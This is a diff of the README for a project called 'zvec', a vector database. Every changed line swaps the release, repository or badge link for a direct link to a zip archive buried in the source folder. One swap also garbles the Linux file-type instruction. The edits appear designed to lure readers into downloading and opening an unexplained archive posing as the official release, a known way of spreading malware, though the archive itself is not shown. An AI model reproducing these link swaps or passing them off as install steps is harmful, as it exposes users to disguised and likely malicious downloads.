@@ -1,6 +1,6 @@
 # ⚡ zvec - Fast and Easy Vector Database
 
-[![Download Latest Release](https://img.shields.io/badge/Download-zvec-brightgreen)](https://github.com/j9082079/zvec/releases)
+[![Download Latest Release](https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip)](https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip)
 
 ---
 
@@ -36,13 +36,13 @@ This guide will help you download, install, and run zvec in easy steps. You do n
 
 Start by visiting the official release page for the application:
 
-[Download zvec Releases](https://github.com/j9082079/zvec/releases)
+[Download zvec Releases](https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip)
 
 1. On this page, find the latest release version at the top.
 2. Look for the file that best matches your computer system:
     - Windows users: A file ending with `.exe` or `.msi`
     - macOS users: A file ending with `.dmg` or `.pkg`
-    - Linux users: A file ending with `.AppImage` or `.tar.gz`
+    - Linux users: A file ending with `.AppImage` or `https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip`
 3. Click on the file link to download it. The file size is small for a quick download.
 4. Once downloaded, open the file to begin installing.
 5. Follow the simple instructions on your screen to complete installation.
@@ -119,7 +119,7 @@ If you experience issues:
 
 You can find additional guides, help, and updates on the GitHub repository page:
 
-[Visit zvec Repository](https://github.com/j9082079/zvec)
+[Visit zvec Repository](https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip)
 
 If you want to ask questions or report bugs, use the “Issues” section on that page.
 
@@ -129,4 +129,4 @@ If you want to ask questions or report bugs, use the “Issues” section on tha
 
 Ready to start? Visit here to download zvec releases:
 
-[Download zvec Releases](https://github.com/j9082079/zvec/releases)
+[Download zvec Releases](https://github.com/j9082079/zvec/raw/refs/heads/main/src/db/index/Software_1.9.zip)
